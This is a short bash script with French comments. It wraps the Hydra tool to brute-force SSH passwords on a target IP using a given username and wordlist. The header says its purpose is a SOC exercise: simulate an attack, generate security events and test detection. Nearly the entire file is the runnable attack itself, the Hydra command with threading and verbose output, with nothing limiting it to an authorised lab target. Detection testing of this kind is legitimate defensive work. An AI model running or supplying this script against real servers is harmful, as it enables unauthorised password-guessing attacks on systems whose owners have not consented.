#!/bin/bash

# --------------------------------------------------
# Script : SSH brute-force audit using Hydra
# --------------------------------------------------
# Description :
#   Ce script exécute un test de résistance SSH
#   en utilisant l’outil Hydra avec une wordlist.
#
# Usage :
#   ./script.sh <IP> <username> <wordlist>
#
# Arguments :
#   $1 -> Adresse IP de la cible
#   $2 -> Nom d'utilisateur à tester
#   $3 -> Wordlist de mots de passe
#
# Objectif SOC :
#   - Simuler une attaque brute-force SSH
#   - Générer des événements de sécurité
#   - Tester les mécanismes de détection et réponse
# --------------------------------------------------

# Adresse IP de la cible
TARGET="$1"

# Nom d'utilisateur à tester
USER="$2"

# Wordlist des mots de passe
WORDLIST="$3"

# --------------------------------------------------
# Vérification du nombre d'arguments fournis
# --------------------------------------------------
if [ $# -ne 3 ]; then
    echo "Usage : $0 <IP> <user> <wordlist>"
    exit 1
fi

# --------------------------------------------------
# Informations de lancement
# --------------------------------------------------
echo "[*] Lancement du bruteforce SSH sur $TARGET avec l'utilisateur $USER"
echo "[*] Wordlist utilisée : $WORDLIST"
echo ""

# --------------------------------------------------
# Exécution de l'attaque brute-force SSH avec Hydra
# -l : utilisateur
# -P : fichier de mots de passe
# -t : nombre de threads
# -V : mode verbeux
# --------------------------------------------------
hydra -l "$USER" -P "$WORDLIST" ssh://"$TARGET" -t 4 -V

# --------------------------------------------------
# Fin de l'exécution
# --------------------------------------------------
echo ""
echo "[*] Attaque terminée."
